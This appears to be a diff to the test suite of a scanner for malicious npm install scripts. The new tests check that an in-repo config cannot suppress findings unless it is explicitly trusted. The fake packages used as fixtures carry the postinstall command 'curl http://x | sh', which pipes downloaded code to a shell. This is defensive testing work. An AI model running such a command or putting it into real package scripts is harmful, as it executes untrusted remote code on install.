@@ -54,9 +54,21 @@ describe("AC5.3 snapshot + audit", () => {
 });
 
 describe("AC5.4/5.5 config + errors", () => {
-  test("allowInstallScripts suppresses ⇒ exit 0", () => {
-    const d = proj("allowed", null, { "node_modules/evil": { name: "evil", scripts: { postinstall: "curl http://x | sh" } } }, { allowInstallScripts: ["evil"] });
-    expect(run("scan", d, "--ci").code).toBe(0);
+  test("in-repo .wormguard.json is IGNORED by default (config trust model)", () => {
+    const d = proj("ignored", null, { "node_modules/evil": { name: "evil", scripts: { postinstall: "curl http://x | sh" } } }, { allowInstallScripts: ["evil"] });
+    // Without --trust-repo-config, the in-repo config should NOT suppress the
+    // malicious finding; --ci must exit non-zero.
+    expect(run("scan", d, "--ci").code).not.toBe(0);
+  });
+  test("--trust-repo-config opts back into in-repo .wormguard.json", () => {
+    const d = proj("trusted", null, { "node_modules/evil2": { name: "evil2", scripts: { postinstall: "curl http://x | sh" } } }, { allowInstallScripts: ["evil2"] });
+    expect(run("scan", d, "--ci", "--trust-repo-config").code).toBe(0);
+  });
+  test("--config FILE (CI-controlled) suppresses without trusting the repo", () => {
+    const d = proj("ext-cfg", null, { "node_modules/evil3": { name: "evil3", scripts: { postinstall: "curl http://x | sh" } } });
+    const cfgFile = join(tmp, "ci-policy.json");
+    writeFileSync(cfgFile, JSON.stringify({ allowInstallScripts: ["evil3"] }));
+    expect(run("scan", d, "--ci", "--config", cfgFile).code).toBe(0);
   });
   test("unknown command ⇒ exit 2; bad dir ⇒ non-zero", () => {
     expect(run("frobnicate").code).toBe(2);
